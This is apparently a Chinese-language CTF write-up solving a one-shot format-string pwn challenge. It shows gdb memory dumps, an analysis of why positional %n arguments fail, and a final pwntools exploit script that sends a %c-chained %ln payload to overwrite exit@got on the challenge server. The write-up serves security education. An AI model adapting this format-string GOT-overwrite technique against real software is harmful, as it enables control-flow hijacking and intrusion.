---
title: pragyanCTF - talking-mirror
categories: [ctf2026, pragyanCTF]
tags: [pwn, format-str]
toc: false
---

格式化字符串漏洞，但是这一题只会执行一次输入，也就是说，没有“泄露信息”的机会。

### 0x01 尝试劫持got表
首先想到的是：利用一次任意位置写的机会，劫持控制流。比如修改got表：
```
pwndbg> checksec
File:     /ctf/pragyan26/talking_mirror/challenge
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
程序在调用一次vuln()函数后，会直接`exit()`退出。
然而实际运行的时候总是异常退出，调试发现got表的地址含有`0x0a`，而程序输入的时候遇到这个字符又会视为换行符而停止输入，这让我们无法完整地在栈上构造目标地址。
```
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /ctf/pragyan26/talking_mirror/challenge:
GOT protection: Partial RELRO | Found 8 GOT entries passing the filter
[0x400a18] _exit@GLIBC_2.2.5 -> 0x401030 ◂— endbr64 
[0x400a20] puts@GLIBC_2.2.5 -> 0x7ffff7e19e00 (puts) ◂— endbr64 
[0x400a28] fclose@GLIBC_2.2.5 -> 0x401050 ◂— endbr64 
[0x400a30] printf@GLIBC_2.2.5 -> 0x401060 ◂— endbr64 
[0x400a38] fgets@GLIBC_2.2.5 -> 0x7ffff7e17b00 (fgets) ◂— endbr64 
[0x400a40] setvbuf@GLIBC_2.2.5 -> 0x7ffff7e1a6a0 (setvbuf) ◂— endbr64 
[0x400a48] fopen@GLIBC_2.2.5 -> 0x401090 ◂— endbr64 
[0x400a50] exit@GLIBC_2.2.5 -> 0x4010a0 ◂— endbr64 
```
```
0x7ffc191a6590:	0x4141414141414141	0x4141414141414141
0x7ffc191a65a0:	0x4141414141414141	0x4141414141414141
0x7ffc191a65b0:	0x4141414141414141	0x4141414141414141
0x7ffc191a65c0:	0x4141414141414141	0x4141414141414141
0x7ffc191a65d0:	0x4141414141414141	0x4141414141414141
0x7ffc191a65e0:	0x3435342541414141	0x6e68243831257336
0x7ffc191a65f0:	0x0000000000000a50	
# 0x400a50无法完整写入
```
接下来的思路：
> **1. 能否用除了修改got表外别的方法？**
>要修改返回地址也要先泄露rsp. 或者利用栈上的现成数据，但是要求比较高，需要恰好有一个指向栈上的指针，而且还必须指向一个返回地址。
而在可修改的段中，前面的`.rela.plt`, `.rela.dyn`
>**2. 能否尝试修改返回地址，来达到“多轮？”**
>失败
>**3. 除了直接写入，有没有别的方法在栈上构造这样的地址？**
>比如能否借助栈上的垃圾值来“拼凑”一个？很遗憾，调试中没有发现能够利用的部分。
再或者，除了用会被截断的字符形式，有没有其他的方式写入got地址？（比如%n）但是这样的问题是，自己在没有泄露rsp的情况下，不知道往哪里写。但是进一步思考，核心问题无非就是”往哪个地址写“和”用哪个参数偏移“不能串起来，如果我们能够在栈上找到一个”链形“结构（一个指针指向的位置相对当前位置固定），那么就能解决这个问题
{: .prompt-tip }

### 0x02 
按照上面的思路，通过调试可以找出：
```
0x7ffd5d48b800 -> 0x7ffd5d48b810
```
使用payload: `b'%4196944s%20$n%1990s%22$n'`，结果：
```
(gdb) x/50gx $rsp
0x7ffd5d48b790:	0x3434393639313425	0x31256e2430322573
0x7ffd5d48b7a0:	0x2432322573303939	0x0000000000000a6e
0x7ffd5d48b7b0:	0x00007f448c00f5c0	0x0000000000000040
0x7ffd5d48b7c0:	0x00007ffd5d48b800	0x00007f448bea9e3a
0x7ffd5d48b7d0:	0x00007f448c082b53	0x0000000000000000
0x7ffd5d48b7e0:	0x0000000000000000	0x00007ffd5d48b938
0x7ffd5d48b7f0:	0x0000000000000001	0x01d6d33d1b789e00
0x7ffd5d48b800:	0x00007ffd5d48b810	0x000000000040134e
0x7ffd5d48b810:	0x00007ffd00400a50	0x00007f448be4e635
```
可以看到 xxx810只有4个字节被修改成了400a50, 继续查阅资料发现%n可以有%ln, %lln修饰！

再次尝试，发现只有第一次写入0x00400a50成功，但是进一步修改got表没有成功：
```
(gdb) x/20gx $rsp                                                                        
0x7fff617689c0:	0x3434393639313425	0x256e6c2430322573
0x7fff617689d0:	0x3232257330393931	0x000000000a6e6c24
0x7fff617689e0:	0x00007f7d7f3435c0	0x0000000000000040
0x7fff617689f0:	0x00007fff61768a30	0x00007f7d7f1dde3a
0x7fff61768a00:	0x00007f7d7f3b6b53	0x0000000000000000
0x7fff61768a10:	0x0000000000000000	0x00007fff61768b68
0x7fff61768a20:	0x0000000000000001	0x7043dd6669195900
0x7fff61768a30:	0x00007fff61768a40	0x000000000040134e
0x7fff61768a40:	0x00007fff61768ae0	0x00007f7d7f182635
0x7fff61768a50:	0x00007f7d7f389000	0x00007fff61768b68
(gdb) ni
0x00000000004012e7 in vuln ()
(gdb) x/20gx $rsp
0x7fff617689c0:	0x3434393639313425	0x256e6c2430322573
0x7fff617689d0:	0x3232257330393931	0x000000000a6e6c24
0x7fff617689e0:	0x00007f7d7f3435c0	0x0000000000000040
0x7fff617689f0:	0x00007fff61768a30	0x00007f7d7f1dde3a
0x7fff61768a00:	0x00007f7d7f3b6b53	0x0000000000000000
0x7fff61768a10:	0x0000000000000000	0x00007fff61768b68
0x7fff61768a20:	0x0000000000000001	0x7043dd6669195900
0x7fff61768a30:	0x00007fff61768a40	0x000000000040134e
0x7fff61768a40:	0x0000000000400a50	0x00007f7d7f182635
0x7fff61768a50:	0x00007f7d7f389000	0x00007fff61768b68
(gdb) x/20gx 0x400a50
0x400a50 <exit@got.plt>:	0x00000000004010a0	0x0000000000000000
0x400a60:	0x0000000000000000	0x0000000000000000
0x400a70 <stdout@GLIBC_2.2.5>:	0x00007f7d7f3435c0	0x0000000000000000
0x400a80 <stdin@GLIBC_2.2.5>:	0x00007f7d7f3428e0	0x0000000000000000
0x400a90:	0x0000000000000000	0x0000000000000000
0x400aa0:	0x0000000000000000	0x0000000000000000
0x400ab0:	0x0000000000000000	0x0000000000000000
0x400ac0:	0x0000000000000000	0x0000000000000000
0x400ad0:	0x0000000000000000	0x0000000000000000
0x400ae0:	0x0000000000000000	0x0000000000000000
(gdb) x/20gx 0x400a00                                                                    
0x400a00:	0x0000000000403e20	0x00007f7d7f3c22f0
0x400a10:	0x00007f7d7f39d3b0	0x0000000000401030
```
因为第二次修改的地址依赖于第一次的写入，所以最大的嫌疑是：第二次`%ln`的地址在第一次写入之前就已经确认了。
后续问ai，确实提到了“preload”机制，原来是格式化字符串在使用`%24$p`这种直接指定参数位置的字符串时，会在操作之前预处理，提取出所有参数，导致我们的策略失效。避免的方法就是不指定参数位置，那么最好控制的就是`%c`了：
```python
from pwn import *

# p = process('./challenge')
p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
elf = ELF('./challenge')
def debug():
    context.terminal = ["tmux", "splitw", "-h"]   # 或者 ["kitty", "@", "launch", "--type=os-window"]
    gdbscript = """
    set pagination off
    b main
    b *0x4012E2
    c
    """

    p = gdb.debug([elf.path], gdbscript=gdbscript)  # 等价于：gdb -q ./chal 并执行上面脚本
    return p

# p = debug()
exit_got = elf.got["exit"]
print(hex(exit_got))

payload = b'%4196926s%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%ln%1990s%ln'
print(payload)

p.sendline(payload)
p.interactive()
```

另外，我以前对于`%4196926s`这种大量的字符输出抱有恐惧，一直以为会输出的很慢，所以会尽量拆成多个`%hn`写入。但是这次尝试后发现完全没有必要, int级别长度的字符串处理的已经够块了